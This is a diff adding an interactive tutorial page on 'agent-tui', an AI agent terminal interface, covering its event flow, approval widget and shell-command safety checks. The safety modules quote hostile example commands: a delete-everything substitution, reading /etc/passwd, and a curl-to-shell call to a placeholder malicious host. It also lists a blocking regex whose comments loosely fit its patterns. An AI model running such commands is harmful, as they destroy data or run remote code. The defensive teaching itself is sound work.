+          </div>
+        </div>
+        <div class="step-card animate-in" style="--stagger-index: 1">
+          <div class="step-num" style="background: var(--color-actor-2)">🔧</div>
+          <div class="step-body">
+            <strong>TOOL_CALL</strong>
+            <p>The agent wants to run a file operation or shell command — needs your approval</p>
+          </div>
+        </div>
+        <div class="step-card animate-in" style="--stagger-index: 2">
+          <div class="step-num" style="background: var(--color-actor-3)">❓</div>
+          <div class="step-body">
+            <strong>ASK_USER</strong>
+            <p>The agent needs clarification on something before continuing</p>
+          </div>
+        </div>
+        <div class="step-card animate-in" style="--stagger-index: 3">
+          <div class="step-num" style="background: var(--color-actor-4)">⚠️</div>
+          <div class="step-body">
+            <strong>ERROR</strong>
+            <p>Something went wrong — the agent will try to recover</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <div class="callout callout-info">
+        <div class="callout-icon">📖</div>
+        <div class="callout-content">
+          <strong class="callout-title">A new vocabulary word</strong>
+          <p>In programming, a <span class="term" data-definition="An enum (enumeration) is a set of named values. Instead of using random numbers, you use clear names like 'RED' or 'GREEN' to make code more readable.">StrEnum</span> is just an enum where all values are strings. EventType uses this so event names are human-readable in logs and code.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">Quiz: Component matching</h2>
+      <div class="quiz-container" id="quiz-2">
+        <div class="quiz-question-block" data-question="q1" data-correct="option-b">
+          <h3 class="quiz-question">You see the word "Stub" in StubAgent. What do you think it does?</h3>
+          <div class="quiz-options">
+            <button class="quiz-option" data-value="option-a" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>A backup agent that kicks in when the main one fails</span>
+            </button>
+            <button class="quiz-option" data-value="option-b" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>A fake implementation for testing — it pretends to be a real agent</span>
+            </button>
+            <button class="quiz-option" data-value="option-c" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>An optimized version that runs faster</span>
+            </button>
+          </div>
+          <div class="quiz-feedback" id="q1-feedback"></div>
+        </div>
+
+        <button class="quiz-check-btn" onclick="checkQuiz('quiz-2')">Check Answers</button>
+        <button class="quiz-reset-btn" onclick="resetQuiz('quiz-2')">Try Again</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Module 3: How the Pieces Talk -->
+<section class="module" id="module-3">
+  <div class="module-content">
+    <header class="module-header animate-in">
+      <span class="module-number">03</span>
+      <h1 class="module-title">How the Pieces Talk</h1>
+      <p class="module-subtitle">Tracing a message from you to the agent and back</p>
+    </header>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">The message journey</h2>
+      <p style="margin-bottom: var(--space-6);">When you type a message and press Enter, here's what happens behind the scenes:</p>
+
+      <div class="chat-window">
+        <div class="chat-messages" id="chat-messages">
+          <div class="chat-message" data-msg="0" data-sender="user" style="display:none">
+            <div class="chat-avatar" style="background: var(--color-actor-1)">👤</div>
+            <div class="chat-bubble">
+              <span class="chat-sender" style="color: var(--color-actor-1)">You</span>
+              <p>Read README.md</p>
+            </div>
+          </div>
+          <div class="chat-message" data-msg="1" data-sender="tui" style="display:none">
+            <div class="chat-avatar" style="background: var(--color-actor-3)">🖥️</div>
+            <div class="chat-bubble">
+              <span class="chat-sender" style="color: var(--color-actor-3)">TUI</span>
+              <p>Got it! Mounting your message widget and forwarding to agent...</p>
+            </div>
+          </div>
+          <div class="chat-message" data-msg="2" data-sender="agent" style="display:none">
+            <div class="chat-avatar" style="background: var(--color-actor-2)">🤖</div>
+            <div class="chat-bubble">
+              <span class="chat-sender" style="color: var(--color-actor-2)">Agent</span>
+              <p>Thinking... I need to read that file. emitting MESSAGE_CHUNK...</p>
+            </div>
+          </div>
+          <div class="chat-message" data-msg="3" data-sender="agent" style="display:none">
+            <div class="chat-avatar" style="background: var(--color-actor-2)">🤖</div>
+            <div class="chat-bubble">
+              <span class="chat-sender" style="color: var(--color-actor-2)">Agent</span>
+              <p>Tool needed: read_file. emitting TOOL_CALL event...</p>
+            </div>
+          </div>
+          <div class="chat-message" data-msg="4" data-sender="adapter" style="display:none">
+            <div class="chat-avatar" style="background: var(--color-actor-4)">🔌</div>
+            <div class="chat-bubble">
+              <span class="chat-sender" style="color: var(--color-actor-4)">Adapter</span>
+              <p>Got TOOL_CALL for read_file. Requesting approval from user...</p>
+            </div>
+          </div>
+          <div class="chat-message" data-msg="5" data-sender="tui" style="display:none">
+            <div class="chat-avatar" style="background: var(--color-actor-3)">🖥️</div>
+            <div class="chat-bubble">
+              <span class="chat-sender" style="color: var(--color-actor-3)">TUI</span>
+              <p>Showing approval widget!</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="chat-typing" id="chat-typing" style="display:none">
+          <div class="chat-avatar" id="typing-avatar" style="background: var(--color-actor-2)">🤖</div>
+          <div class="chat-typing-dots">
+            <span class="typing-dot"></span>
+            <span class="typing-dot"></span>
+            <span class="typing-dot"></span>
+          </div>
+        </div>
+
+        <div class="chat-controls">
+          <button onclick="playChatNext()">Next Message</button>
+          <button onclick="playChatAll()">Play All</button>
+          <button onclick="resetChat()">Replay</button>
+          <span class="chat-progress" id="chat-progress">0 / 6 messages</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">The AgentAdapter — the translator</h2>
+      <p style="margin-bottom: var(--space-4);">The adapter's job is to listen to events from the agent and call the right TUI methods. Here's the core dispatch logic:</p>
+      <div class="translation-block">
+        <div class="translation-code">
+          <span class="translation-label">CODE</span>
+          <pre><code><span class="code-keyword">async def</span> <span class="code-function">_dispatch</span>(event):
+  <span class="code-keyword">match</span> event.type:
+    <span class="code-keyword">case</span> EventType.MESSAGE_CHUNK:
+      app.<span class="code-function">append_assistant_text</span>(event.text)
+
+    <span class="code-keyword">case</span> EventType.TOOL_CALL:
+      approved = <span class="code-keyword">await</span> app.<span class="code-function">request_tool_approval</span>(...)
+      <span class="code-keyword">await</span> agent.<span class="code-function">approve_tool</span>(tool_id, approved)
+
+    <span class="code-keyword">case</span> EventType.TOOL_RESULT:
+      app.<span class="code-function">show_tool_result</span>(...)</code></pre>
+        </div>
+        <div class="translation-english">
+          <span class="translation-label">PLAIN ENGLISH</span>
+          <p class="tl">When a MESSAGE_CHUNK comes in, append text to the chat display</p>
+          <p class="tl">When a TOOL_CALL comes in, ask the user for approval, then tell the agent what they chose</p>
+          <p class="tl">When a TOOL_RESULT comes in, show the result in the UI</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <div class="callout callout-accent">
+        <div class="callout-icon">💡</div>
+        <div class="callout-content">
+          <strong class="callout-title">Why this separation matters</strong>
+          <p>The adapter doesn't know or care HOW the TUI shows things — it just calls methods. This means you could swap out the entire UI (say, for a web interface) without touching the agent code at all.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">Quiz: Event routing</h2>
+      <div class="quiz-container" id="quiz-3">
+        <div class="quiz-question-block" data-question="q1" data-correct="option-c">
+          <h3 class="quiz-question">An agent emits a TOOL_RESULT event. Where does the adapter send this?</h3>
+          <div class="quiz-options">
+            <button class="quiz-option" data-value="option-a" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>Directly to the agent for processing</span>
+            </button>
+            <button class="quiz-option" data-value="option-b" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>To the approval widget</span>
+            </button>
+            <button class="quiz-option" data-value="option-c" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>To the TUI's show_tool_result method</span>
+            </button>
+          </div>
+          <div class="quiz-feedback" id="q1-feedback"></div>
+        </div>
+
+        <button class="quiz-check-btn" onclick="checkQuiz('quiz-3')">Check Answers</button>
+        <button class="quiz-reset-btn" onclick="resetQuiz('quiz-3')">Try Again</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Module 4: The Approval System -->
+<section class="module" id="module-4">
+  <div class="module-content">
+    <header class="module-header animate-in">
+      <span class="module-number">04</span>
+      <h1 class="module-title">The Approval System</h1>
+      <p class="module-subtitle">How agent-tui keeps dangerous operations under your control</p>
+    </header>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">Why approval matters</h2>
+      <p style="margin-bottom: var(--space-4);">An AI agent that can read files, write code, and run shell commands is powerful — and potentially dangerous. The approval system puts YOU in control.</p>
+      <div class="pattern-cards stagger-children">
+        <div class="pattern-card animate-in" style="--stagger-index: 0; border-top: 3px solid var(--color-actor-1)">
+          <div class="pattern-icon" style="background: var(--color-actor-1)">👁️</div>
+          <h4 class="pattern-title">You see what's coming</h4>
+          <p class="pattern-desc">Before any file is touched or command runs, you see exactly what will happen</p>
+        </div>
+        <div class="pattern-card animate-in" style="--stagger-index: 1; border-top: 3px solid var(--color-actor-2)">
+          <div class="pattern-icon" style="background: var(--color-actor-2)">✋</div>
+          <h4 class="pattern-title">You choose</h4>
+          <p class="pattern-desc">Approve safe operations, deny suspicious ones, or auto-approve with Ctrl+T</p>
+        </div>
+        <div class="pattern-card animate-in" style="--stagger-index: 2; border-top: 3px solid var(--color-actor-3)">
+          <div class="pattern-icon" style="background: var(--color-actor-3)">🔄</div>
+          <h4 class="pattern-title">Agent waits</h4>
+          <p class="pattern-desc">The agent pauses until you decide — it can't proceed without your say-so</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">What the adapter checks before showing the approval</h2>
+      <p style="margin-bottom: var(--space-4);">Before the approval widget even appears, the adapter does safety checks:</p>
+      <div class="step-cards">
+        <div class="step-card">
+          <div class="step-num" style="background: var(--color-actor-1)">1</div>
+          <div class="step-body">
+            <strong>Is it a file tool?</strong>
+            <p>Check if the path is within allowed directories</p>
+          </div>
+        </div>
+        <div class="step-card">
+          <div class="step-num" style="background: var(--color-actor-2)">2</div>
+          <div class="step-body">
+            <strong>Is it a shell command?</strong>
+            <p>Check for dangerous patterns like $(command) or $VAR</p>
+          </div>
+        </div>
+        <div class="step-card">
+          <div class="step-num" style="background: var(--color-actor-3)">3</div>
+          <div class="step-body">
+            <strong>Show approval widget</strong>
+            <p>If checks pass, show the widget and wait for user input</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">The approval flow in code</h2>
+      <div class="translation-block">
+        <div class="translation-code">
+          <span class="translation-label">CODE</span>
+          <pre><code><span class="code-keyword">case</span> EventType.TOOL_CALL:
+  <span class="code-comment"># Check for dangerous shell patterns</span>
+  <span class="code-keyword">if</span> event.tool_name == <span class="code-string">"execute"</span>:
+    <span class="code-keyword">if</span> <span class="code-function">contains_dangerous_patterns</span>(command):
+      <span class="code-keyword">await</span> agent.<span class="code-function">approve_tool</span>(tool_id, False)
+      app.<span class="code-function">show_error</span>(<span class="code-string">"Command blocked"</span>)
+      <span class="code-keyword">return</span>
+
+  <span class="code-comment"># Request approval from user</span>
+  approved = <span class="code-keyword">await</span> app.<span class="code-function">request_tool_approval</span>(...)
+  <span class="code-keyword">await</span> agent.<span class="code-function">approve_tool</span>(tool_id, approved)</code></pre>
+        </div>
+        <div class="translation-english">
+          <span class="translation-label">PLAIN ENGLISH</span>
+          <p class="tl">For execute (shell) commands, check if the command contains dangerous patterns first</p>
+          <p class="tl">If dangerous patterns are found, auto-reject and show an error message</p>
+          <p class="tl">If it's safe, show the approval widget and wait for the user</p>
+          <p class="tl">Forward the user's decision (approved/denied) back to the agent</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <div class="callout callout-warning">
+        <div class="callout-icon">⚠️</div>
+        <div class="callout-content">
+          <strong class="callout-title">The approval is a speed bump, not a wall</strong>
+          <p>Once you approve a tool, the agent can use it multiple times. Use auto-approve (Ctrl+T) wisely — it's meant for trusted code review workflows where you've already inspected what the agent is doing.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">Quiz: Approval logic</h2>
+      <div class="quiz-container" id="quiz-4">
+        <div class="quiz-question-block" data-question="q1" data-correct="option-a">
+          <h3 class="quiz-question">The agent wants to run: execute echo $HOME. What happens?</h3>
+          <div class="quiz-options">
+            <button class="quiz-option" data-value="option-a" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>Blocked immediately — $VAR is a dangerous pattern</span>
+            </button>
+            <button class="quiz-option" data-value="option-b" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>Shows approval widget — you decide</span>
+            </button>
+            <button class="quiz-option" data-value="option-c" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>Runs automatically because echo is safe</span>
+            </button>
+          </div>
+          <div class="quiz-feedback" id="q1-feedback"></div>
+        </div>
+
+        <button class="quiz-check-btn" onclick="checkQuiz('quiz-4')">Check Answers</button>
+        <button class="quiz-reset-btn" onclick="resetQuiz('quiz-4')">Try Again</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Module 5: Shell Safety -->
+<section class="module" id="module-5">
+  <div class="module-content">
+    <header class="module-header animate-in">
+      <span class="module-number">05</span>
+      <h1 class="module-title">Shell Safety</h1>
+      <p class="module-subtitle">The dangerous patterns that get blocked before you even see them</p>
+    </header>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">Why shell commands are scary</h2>
+      <p style="margin-bottom: var(--space-6);">Shell commands can do almost anything — delete files, exfiltrate data, install malware. Even a "safe" command like <code>cat</code> can be weaponized. Here's what agent-tui blocks:</p>
+      <div class="code-block">
+<span class="code-comment"># Command substitution — lets commands hide inside commands</span>
+$(rm -rf /)
+`cat /etc/passwd`
+
+<span class="code-comment"># Variable expansion — can inject arbitrary commands</span>
+$HOME
+${PATH}
+$((1+1))
+
+<span class="code-comment"># Process substitution — runs commands in a subshell</span>
+<(some command)
+>(some command)
+
+<span class="code-comment"># Redirections — can overwrite or append to files</span>
+>>
+>
+<
+<<
+
+<span class="code-comment"># Newlines and special characters — can break out of commands</span>
+\n
+\r
+\t</div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">The pattern checker</h2>
+      <p style="margin-bottom: var(--space-4);">The <span class="term" data-definition="A regular expression (regex) is a pattern-matching language. It's like a super-powered find-and-replace that can match complex patterns like 'anything starting with $ followed by letters'.">regex</span> that detects these dangerous patterns:</p>
+      <div class="translation-block">
+        <div class="translation-code">
+          <span class="translation-label">CODE</span>
+          <pre><code>DANGEROUS_SHELL_PATTERNS = [
+    <span class="code-string">r'\$'</span>,      <span class="code-comment"># $ at start of variable</span>
+    <span class="code-string">r'\`'</span>,      <span class="code-comment"># backticks</span>
+    <span class="code-string">r'\$('</span>,     <span class="code-comment"># $(command)</span>
+    <span class="code-string">r'<>'</span>,     <span class="code-comment"># process substitution</span>
+    <span class="code-string">r'>>'</span>,     <span class="code-comment"># append redirect</span>
+    <span class="code-string">r'\s>>\s'</span>,  <span class="code-comment"># space + >></span>
+    <span class="code-string">r'<<<'</span>,    <span class="code-comment"># here string</span>
+]</code></pre>
+        </div>
+        <div class="translation-english">
+          <span class="translation-label">PLAIN ENGLISH</span>
+          <p class="tl">Any $ character — could be variable expansion</p>
+          <p class="tl">Backticks — old-style command substitution</p>
+          <p class="tl">$(...) — command substitution syntax</p>
+          <p class="tl"><> — process substitution syntax</p>
+          <p class="tl">>> or any redirect operator</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">Safe commands that DO work</h2>
+      <p style="margin-bottom: var(--space-4);">Not all shell commands are blocked. Simple commands without special characters are fine:</p>
+      <div class="pattern-cards">
+        <div class="pattern-card">
+          <div class="pattern-icon" style="background: var(--color-success)">✓</div>
+          <h4 class="pattern-title">echo hello</h4>
+          <p class="pattern-desc">Prints text to the terminal</p>
+        </div>
+        <div class="pattern-card">
+          <div class="pattern-icon" style="background: var(--color-success)">✓</div>
+          <h4 class="pattern-title">ls -la</h4>
+          <p class="pattern-desc">Lists files with details</p>
+        </div>
+        <div class="pattern-card">
+          <div class="pattern-icon" style="background: var(--color-success)">✓</div>
+          <h4 class="pattern-title">git status</h4>
+          <p class="pattern-desc">Shows git repository state</p>
+        </div>
+        <div class="pattern-card">
+          <div class="pattern-icon" style="background: var(--color-success)">✓</div>
+          <h4 class="pattern-title">pwd</h4>
+          <p class="pattern-desc">Prints working directory</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <div class="callout callout-info">
+        <div class="callout-icon">🛡️</div>
+        <div class="callout-content">
+          <strong class="callout-title">Defense in depth</strong>
+          <p>The dangerous pattern check happens BEFORE the approval widget. This means even if you're not paying attention, basic malicious patterns are blocked automatically. You only see the widget for commands that pass this first check.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">Quiz: Danger detection</h2>
+      <div class="quiz-container" id="quiz-5">
+        <div class="quiz-question-block" data-question="q1" data-correct="option-b">
+          <h3 class="quiz-question">Which of these would be blocked? (Select all that apply)</h3>
+          <div class="quiz-options">
+            <button class="quiz-option" data-value="option-a" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>echo hello</span>
+            </button>
+            <button class="quiz-option" data-value="option-b" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>$(curl malicious.com | sh)</span>
+            </button>
+            <button class="quiz-option" data-value="option-c" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>cat file.txt</span>
+            </button>
+            <button class="quiz-option" data-value="option-d" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>echo hello > output.txt</span>
+            </button>
+          </div>
+          <div class="quiz-feedback" id="q1-feedback"></div>
+        </div>
+
+        <button class="quiz-check-btn" onclick="checkQuiz('quiz-5')">Check Answers</button>
+        <button class="quiz-reset-btn" onclick="resetQuiz('quiz-5')">Try Again</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Module 6: The Big Picture -->
+<section class="module" id="module-6">
+  <div class="module-content">
+    <header class="module-header animate-in">
+      <span class="module-number">06</span>
+      <h1 class="module-title">The Big Picture</h1>
+      <p class="module-subtitle">Putting it all together</p>
+    </header>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">The complete architecture</h2>
+      <p style="margin-bottom: var(--space-6);">Here's how everything fits together:</p>
+      <div class="pattern-cards stagger-children">
+        <div class="pattern-card animate-in" style="--stagger-index: 0; border-top: 3px solid var(--color-actor-1)">
+          <div class="pattern-icon" style="background: var(--color-actor-1)">🖥️</div>
+          <h4 class="pattern-title">Textual UI</h4>
+          <p class="pattern-desc">The user interface — chat input, messages, approval widgets, status bar</p>
+        </div>
+        <div class="pattern-card animate-in" style="--stagger-index: 1; border-top: 3px solid var(--color-actor-2)">
+          <div class="pattern-icon" style="background: var(--color-actor-2)">🔌</div>
+          <h4 class="pattern-title">AgentAdapter</h4>
+          <p class="pattern-desc">Translates agent events to UI actions, handles safety checks</p>
+        </div>
+        <div class="pattern-card animate-in" style="--stagger-index: 2; border-top: 3px solid var(--color-actor-3)">
+          <div class="pattern-icon" style="background: var(--color-actor-3)">📝</div>
+          <h4 class="pattern-title">AgentProtocol</h4>
+          <p class="pattern-desc">The contract any agent backend must implement</p>
+        </div>
+        <div class="pattern-card animate-in" style="--stagger-index: 3; border-top: 3px solid var(--color-actor-4)">
+          <div class="pattern-icon" style="background: var(--color-actor-4)">🎭</div>
+          <h4 class="pattern-title">StubAgent</h4>
+          <p class="pattern-desc">Testing agent — cycles through scenarios automatically</p>
+        </div>
+        <div class="pattern-card animate-in" style="--stagger-index: 4; border-top: 3px solid var(--color-actor-5)">
+          <div class="pattern-icon" style="background: var(--color-actor-5)">🔧</div>
+          <h4 class="pattern-title">DeepAgentsAdapter</h4>
+          <p class="pattern-desc">Real agent — connects to actual AI models via LangGraph</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">The key design patterns you can use in your own projects</h2>
+      <div class="icon-rows">
+        <div class="icon-row animate-in">
+          <div class="icon-circle" style="background: var(--color-accent)">🔌</div>
+          <div>
+            <strong>Protocol-based design</strong>
+            <p>Define what your code MUST do as a protocol, not how it does it. This lets you swap implementations without changing consumers.</p>
+          </div>
+        </div>
+        <div class="icon-row animate-in">
+          <div class="icon-circle" style="background: var(--color-actor-2)">🎯</div>
+          <div>
+            <strong>Event-driven architecture</strong>
+            <p>Components communicate by emitting events, not calling each other directly. This makes the system easier to extend and test.</p>
+          </div>
+        </div>
+        <div class="icon-row animate-in">
+          <div class="icon-circle" style="background: var(--color-actor-3)">🛡️</div>
+          <div>
+            <strong>Defense in depth</strong>
+            <p>Multiple layers of safety — dangerous pattern check first, then approval widget, then user decision. Each layer catches something the others might miss.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <h2 class="screen-heading">Final quiz: Putting it all together</h2>
+      <div class="quiz-container" id="quiz-6">
+        <div class="quiz-question-block" data-question="q1" data-correct="option-c">
+          <h3 class="quiz-question">You want to add a new feature to agent-tui: a tool that sends emails. Which files would you likely need to modify?</h3>
+          <div class="quiz-options">
+            <button class="quiz-option" data-value="option-a" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>Only the TUI — agents handle tools automatically</span>
+            </button>
+            <button class="quiz-option" data-value="option-b" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>Only the adapter — it dispatches all tools</span>
+            </button>
+            <button class="quiz-option" data-value="option-c" onclick="selectOption(this)">
+              <div class="quiz-option-radio"></div>
+              <span>The agent backend (to implement the tool) and possibly the adapter (if it needs special handling)</span>
+            </button>
+          </div>
+          <div class="quiz-feedback" id="q1-feedback"></div>
+        </div>
+
+        <button class="quiz-check-btn" onclick="checkQuiz('quiz-6')">Check Answers</button>
+        <button class="quiz-reset-btn" onclick="resetQuiz('quiz-6')">Try Again</button>
+      </div>
+    </div>
+
+    <div class="screen animate-in">
+      <div class="callout callout-accent">
+        <div class="callout-icon">🎓</div>
+        <div class="callout-content">
+          <strong class="callout-title">You made it!</strong>
+          <p>You now understand how agent-tui works. The key takeaway: the protocol pattern lets you build flexible systems where components can be swapped. The approval system adds safety without adding complexity to the agent code. And defense in depth — checking dangerous patterns before showing the widget — makes the system safer without annoying the user.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<script>
+// ==================== Tooltip System ====================
+let activeTooltip = null;
+
+function positionTooltip(term, tip) {
+  const rect = term.getBoundingClientRect();
+  const tipWidth = 300;
+  let left = rect.left + rect.width / 2 - tipWidth / 2;
+  left = Math.max(8, Math.min(left, window.innerWidth - tipWidth - 8));
+  let top = rect.top - 8;
+  tip.style.left = left + 'px';
+  document.body.appendChild(tip);
+  const tipHeight = tip.offsetHeight;
+  if (rect.top - tipHeight - 8 < 0) {
+    tip.style.top = (rect.bottom + 8) + 'px';
+    tip.classList.add('flip');
+  } else {
+    tip.style.top = (rect.top - tipHeight - 8) + 'px';
+    tip.classList.remove('flip');
+  }
+}
+
+document.querySelectorAll('.term').forEach(term => {
+  const tip = document.createElement('span');
+  tip.className = 'term-tooltip';
+  tip.textContent = term.dataset.definition;
+
+  term.addEventListener('mouseenter', () => {
+    if (activeTooltip && activeTooltip !== tip) {
+      activeTooltip.classList.remove('visible');
+      activeTooltip.remove();
+    }
+    positionTooltip(term, tip);
+    requestAnimationFrame(() => tip.classList.add('visible'));
+    activeTooltip = tip;
+  });
+
+  term.addEventListener('mouseleave', () => {
+    tip.classList.remove('visible');
+    setTimeout(() => { if (!tip.classList.contains('visible')) tip.remove(); }, 150);
+    activeTooltip = null;
+  });
+
+  term.addEventListener('click', (e) => {
+    e.stopPropagation();
+    if (tip.classList.contains('visible')) {
+      tip.classList.remove('visible');
+      tip.remove();
+      activeTooltip = null;
+    } else {
+      positionTooltip(term, tip);
+      requestAnimationFrame(() => tip.classList.add('visible'));
+      activeTooltip = tip;
+    }
+  });
+});
+
+document.addEventListener('click', () => {
+  if (activeTooltip) {
+    activeTooltip.classList.remove('visible');
+    activeTooltip.remove();
+    activeTooltip = null;
+  }
+});
+
+// ==================== Progress Bar ====================
+const progressBar = document.getElementById('progress-bar');
+const navDots = document.querySelectorAll('.nav-dot');
+const modules = document.querySelectorAll('.module');
+
+function updateProgress() {
+  const scrollTop = window.scrollY;
+  const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
+  const progress = (scrollTop / scrollHeight) * 100;
+  progressBar.style.width = progress + '%';
+
+  // Update nav dots
+  let currentModule = 0;
+  modules.forEach((module, i) => {
+    const rect = module.getBoundingClientRect();
+    if (rect.top < window.innerHeight / 2) {
+      currentModule = i;
+    }
+  });
+
+  navDots.forEach((dot, i) => {
+    dot.classList.remove('active', 'visited');
+    if (i < currentModule) dot.classList.add('visited');
+    if (i === currentModule) dot.classList.add('active');
+  });
+}
+
+window.addEventListener('scroll', () => {
+  requestAnimationFrame(updateProgress);
+}, { passive: true });
+
+// Nav dot click
+navDots.forEach(dot => {
+  dot.addEventListener('click', () => {
+    const target = document.getElementById(dot.dataset.target);
+    if (target) target.scrollIntoView({ behavior: 'smooth' });
+  });
+});
+
+// ==================== Scroll Animations ====================
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { rootMargin: '0px 0px -10% 0px', threshold: 0.1 });
+
+document.querySelectorAll('.animate-in').forEach(el => observer.observe(el));
+
+// ==================== Flow Animation ====================
+const flowSteps = [
+  { highlight: 'user', label: 'You type: "execute echo hello" and press Enter' },
+  { highlight: 'tui', label: 'TUI receives your message and mounts a widget showing your text' },
+  { highlight: 'agent', label: 'TUI forwards to agent. Agent streams back: "I need to run echo"' },
+  { highlight: 'agent', label: 'Agent emits TOOL_CALL event for the "execute" tool' },
+  { highlight: 'tui', label: 'TUI shows approval widget. You click "y" to approve' },
+];
+
+let flowStep = 0;
+
+function flowNext() {
+  if (flowStep >= flowSteps.length) return;
+  const step = flowSteps[flowStep];
+
+  document.querySelectorAll('.flow-actor').forEach(a => a.classList.remove('active'));
+  document.getElementById(`flow-${step.highlight}`).classList.add('active');
+
+  document.getElementById('flow-label').textContent = step.label;
+  document.getElementById('flow-progress').textContent = `Step ${flowStep + 1}/${flowSteps.length}`;
+
+  flowStep++;
+}
+
+function flowReset() {
+  flowStep = 0;
+  document.querySelectorAll('.flow-actor').forEach(a => a.classList.remove('active'));
+  document.getElementById('flow-label').textContent = 'Click "Next Step" to begin';
+  document.getElementById('flow-progress').textContent = 'Step 0/5';
+}
+
+// ==================== Chat Animation ====================
+const chatActors = {
+  'user': { initials: '👤', color: 'var(--color-actor-1)' },
+  'tui': { initials: '🖥️', color: 'var(--color-actor-3)' },
+  'agent': { initials: '🤖', color: 'var(--color-actor-2)' },
+  'adapter': { initials: '🔌', color: 'var(--color-actor-4)' }
+};
+
+const chatMessages = document.querySelectorAll('#chat-messages .chat-message');
+let chatIndex = 0;
+
+function playChatNext() {
+  if (chatIndex >= chatMessages.length) return;
+  const msg = chatMessages[chatIndex];
+  const sender = msg.dataset.sender;
+
+  const typing = document.getElementById('chat-typing');
+  const avatar = document.getElementById('typing-avatar');
+  avatar.textContent = chatActors[sender].initials;
+  avatar.style.background = chatActors[sender].color;
+  typing.style.display = 'flex';
+
+  setTimeout(() => {
+    typing.style.display = 'none';
+    msg.style.display = 'flex';
+    chatIndex++;
+    document.getElementById('chat-progress').textContent = `${chatIndex} / ${chatMessages.length} messages`;
+  }, 800);
+}
+
+function playChatAll() {
+  const interval = setInterval(() => {
+    if (chatIndex >= chatMessages.length) { clearInterval(interval); return; }
+    playChatNext();
+  }, 1200);
+}
+
+function resetChat() {
+  chatIndex = 0;
+  chatMessages.forEach(m => m.style.display = 'none');
+  document.getElementById('chat-progress').textContent = `0 / ${chatMessages.length} messages`;
+}
+
+// ==================== Quiz System ====================
+window.selectOption = function(btn) {
+  const block = btn.closest('.quiz-question-block');
+  block.querySelectorAll('.quiz-option').forEach(o => o.classList.remove('selected'));
+  btn.classList.add('selected');
+};
+
+function getExplanation(q, isCorrect) {
+  if (!isCorrect) {
+    return "Not quite — think about what the safety systems in agent-tui are designed to prevent.";
+  }
+  return "Exactly right! This is how the safety systems work in practice.";
+}
+
+window.checkQuiz = function(sectionId) {
+  const container = document.getElementById(sectionId);
+  const questions = container.querySelectorAll('.quiz-question-block');
+  let correct = 0;
+
+  questions.forEach(q => {
+    const selected = q.querySelector('.quiz-option.selected');
+    const feedback = q.querySelector('.quiz-feedback');
+    const correctValue = q.dataset.correct;
+
+    if (!selected) {
+      feedback.innerHTML = 'Pick an answer first!';
+      feedback.className = 'quiz-feedback show warning';
+      return;
+    }
+
+    if (selected.dataset.value === correctValue) {
+      correct++;
+      selected.classList.add('correct');
+      feedback.innerHTML = '<strong>Exactly!</strong> ' + getExplanation(q, true);
+      feedback.className = 'quiz-feedback show success';
+    } else {
+      selected.classList.add('incorrect');
+      q.querySelector(`[data-value="${correctValue}"]`).classList.add('correct');
+      feedback.innerHTML = '<strong>Not quite.</strong> ' + getExplanation(q, false);
+      feedback.className = 'quiz-feedback show error';
+    }
+
+    q.querySelectorAll('.quiz-option').forEach(o => o.disabled = true);
+  });
+};
+
+window.resetQuiz = function(sectionId) {
+  const container = document.getElementById(sectionId);
+  const questions = container.querySelectorAll('.quiz-question-block');
+
+  questions.forEach(q => {
+    q.querySelectorAll('.quiz-option').forEach(o => {
+      o.disabled = false;
+      o.classList.remove('selected', 'correct', 'incorrect');
+    });
+    const feedback = q.querySelector('.quiz-feedback');
+    feedback.className = 'quiz-feedback';
+    feedback.innerHTML = '';
+  });
+};
